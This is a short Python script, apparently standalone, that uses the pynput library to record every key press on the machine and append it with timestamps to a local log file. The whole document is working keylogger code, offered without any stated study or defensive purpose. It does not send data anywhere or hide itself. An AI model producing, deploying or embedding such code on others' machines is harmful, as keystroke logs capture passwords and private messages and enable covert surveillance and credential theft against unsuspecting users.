import time
from pynput import keyboard # pip install pynput
from datetime import datetime

def dt_now():
    return datetime.now().strftime("%Y-%m-%d, %H:%M")

def append(path, text):
    with open(path, "a+") as f:
        f.write(text)

def on_press(key):
    global current_dt
    if dt_now() != current_dt:
        current_dt = dt_now()
        append(output_path, f"\n{current_dt}\n") 
    try:
        k = key.char
        append(output_path, f"{k}") 
    except:
        k = key.name
        append(output_path, f"[{k}]") 

output_path = "out.log"
listener = keyboard.Listener(on_press=on_press)
print("listening...")
current_dt = dt_now()
append(output_path, f"{current_dt}\n")
listener.start()
while True:
    time.sleep(100000) # zzz...
